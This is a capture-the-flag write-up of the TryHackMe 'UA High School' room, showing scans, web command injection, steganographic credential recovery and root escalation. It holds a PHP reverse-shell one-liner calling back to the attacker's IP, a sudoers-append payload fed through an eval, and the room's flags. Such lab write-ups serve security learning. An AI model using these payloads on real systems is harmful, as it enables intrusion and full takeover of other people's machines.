# UA High School TryHackMe Writeup

- Link: https://tryhackme.com/room/yueiua
- IP Address: 10.10.119.101
- Date: 24 June, 2025

-> nmap scan:

```┌──(kali㉿kali)-[~/Downloads/THM/UAHigh]
└─$ nmap -sC -sV 10.10.119.101 -o nmapscan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 13:25 +04
Nmap scan report for 10.10.119.101
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a6:0a:53:ce:2b:0f:8b:f8:86:ad:fa:6b:d0:7a:ce:41 (RSA)
|   256 d1:ce:aa:d8:02:64:7c:7d:d4:97:98:6f:aa:e3:a3:35 (ECDSA)
|_  256 65:cf:b0:54:ff:81:fc:ea:1b:e2:67:83:fa:92:39:95 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.75 seconds
```

-> Port 80 Webpage:

![](attachments/Pasted%20image%2020250624132712.png)

-> Directory enumeration using Gobuster:

```┌──(kali㉿kali)-[~/Downloads/THM/UAHigh]
└─$ gobuster dir -u http://10.10.119.101 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.119.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.119.101/assets/]
/index.html           (Status: 200) [Size: 1988]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

-> /assets is a blank page. Enumerating further from /assets:

```┌──(kali㉿kali)-[~/Downloads/THM/UAHigh]
└─$ gobuster dir -u http://10.10.119.101/assets -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.119.101/assets
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 322] [--> http://10.10.119.101/assets/images/]                                                                                   
/index.php            (Status: 200) [Size: 0]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

-> Found /assets/index.php 
-> Testing for command injection:

![](attachments/Pasted%20image%2020250624133918.png)

```┌──(kali㉿kali)-[~/Downloads/THM/UAHigh]
└─$ echo "L3Zhci93d3cvaHRtbC9hc3NldHMK" | base64 -d
/var/www/html/assets
```

-> Webpage seems to be vulnerable to command injection 
-> Trying to get a reverse connection using:

```
php -r '$sock=fsockopen("10.8.35.149",4433); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'
```

```┌──(kali㉿kali)-[~/Downloads/THM/UAHigh]
└─$ nc -lvnp 4433
listening on [any] 4433 ...
connect to [10.8.35.149] from (UNKNOWN) [10.10.119.101] 48296
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-10-119-101:/var/www/html/assets$
```

-> Success!
-> Finding useful files:

```
www-data@ip-10-10-119-101:/home/deku$ find / -user root -perm /4000 2>/dev/null
<ome/deku$ find / -user root -perm /4000 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/core20/2571/usr/bin/chfn
/snap/core20/2571/usr/bin/chsh
/snap/core20/2571/usr/bin/gpasswd
/snap/core20/2571/usr/bin/mount
/snap/core20/2571/usr/bin/newgrp
/snap/core20/2571/usr/bin/passwd
/snap/core20/2571/usr/bin/su
/snap/core20/2571/usr/bin/sudo
/snap/core20/2571/usr/bin/umount
/snap/core20/2571/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2571/usr/lib/openssh/ssh-keysign
/snap/snapd/24505/usr/lib/snapd/snap-confine
/snap/snapd/23771/usr/lib/snapd/snap-confine
```

-> Not anything really
-> Going back to original folder, there are two images:

```
www-data@ip-10-10-119-101:/var/www/html/assets/images$ ls
ls
oneforall.jpg  yuei.jpg
```

-> Let's transfer these back to attacker machine and try to extract any useful info
-> While I was at it, I also found a passphrase.txt in a folder:

```
www-data@ip-10-10-119-101:/var/www$ ls -la
ls -la
total 16
drwxr-xr-x  4 www-data www-data 4096 Dec 13  2023 .
drwxr-xr-x 14 root     root     4096 Jul  9  2023 ..
drwxrwxr-x  2 www-data www-data 4096 Jul  9  2023 Hidden_Content
drwxr-xr-x  3 www-data www-data 4096 Dec 13  2023 html
www-data@ip-10-10-119-101:/var/www$ cd Hidden_Content
cd Hidden_Content
www-data@ip-10-10-119-101:/var/www/Hidden_Content$ ls
ls
passphrase.txt
www-data@ip-10-10-119-101:/var/www/Hidden_Content$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
```

-> This might be useful
-> After transferring over the images, I try using steghide on 'oneforall.jpg' using the passphrase which I decoded from base64

```┌──(kali㉿kali)-[~/Downloads/THM/UAHigh]
└─$ steghide --extract -sf oneforall.jpg           
Enter passphrase: 
steghide: the file format of the file "oneforall.jpg" is not supported.
```

-> The file seems to be corrupted. 
-> Using 'hexeditor', I changed the magic bytes of the file to match the .jpg format (FF D8).

```┌──(kali㉿kali)-[~/Downloads/THM/UAHigh]
└─$ steghide --extract -sf oneforall.jpg
Enter passphrase: 
Corrupt JPEG data: 18 extraneous bytes before marker 0xdb
wrote extracted data to "creds.txt".
```
```┌──(kali㉿kali)-[~/Downloads/THM/UAHigh]
└─$ cat creds.txt           
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

-> We have succesfully obtained ssh creds!
-> Logging into SSH

```┌──(kali㉿kali)-[~/Downloads/THM/UAHigh]
└─$ ssh deku@10.10.119.101              
The authenticity of host '10.10.119.101 (10.10.119.101)' can't be established.
ED25519 key fingerprint is SHA256:HKvc5iMcPk25WGlfCW+Z6R06JlEfh+kGCVmU/w1ZmhU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.119.101' (ED25519) to the list of known hosts.
deku@10.10.119.101's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 24 Jun 2025 10:09:00 AM UTC

  System load:  0.0               Processes:             130
  Usage of /:   51.9% of 9.75GB   Users logged in:       0
  Memory usage: 25%               IPv4 address for ens5: 10.10.119.101
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Thu Feb 22 21:27:54 2024 from 10.0.0.3
deku@ip-10-10-119-101:~$ 
```

-> With this, we have obtained the first flag, user.txt

```
deku@ip-10-10-119-101:~$ ls
user.txt
deku@ip-10-10-119-101:~$ cat user.txt
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```

-> Running 'sudo -l' to find interesting files with sudo permission:

```
deku@ip-10-10-119-101:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on ip-10-10-119-101:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-10-119-101:
    (ALL) /opt/NewComponent/feedback.sh
```

-> feedback.sh:

```
deku@ip-10-10-119-101:/opt/NewComponent$ cat feedback.sh 
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

-> This file contains an eval function which can be used to escalate privileges
-> Let's add the user 'deku' to the sudoers file using this

```
deku@ip-10-10-119-101:/opt/NewComponent$ sudo ./feedback.sh 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers
It is This:
Feedback successfully saved.
deku@ip-10-10-119-101:/opt/NewComponent$ sudo -l
Matching Defaults entries for deku on ip-10-10-119-101:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-10-119-101:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL
```

-> Now, we can run '/bin/bash' as sudo and escalate privileges to root

```
deku@ip-10-10-119-101:/opt/NewComponent$ sudo /bin/bash
root@ip-10-10-119-101:/opt/NewComponent# whoami
root
root@ip-10-10-119-101:/opt/NewComponent# cd /root
root@ip-10-10-119-101:~# cat root.txt 
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```

-> Thus, we have found the final flag, root.txt

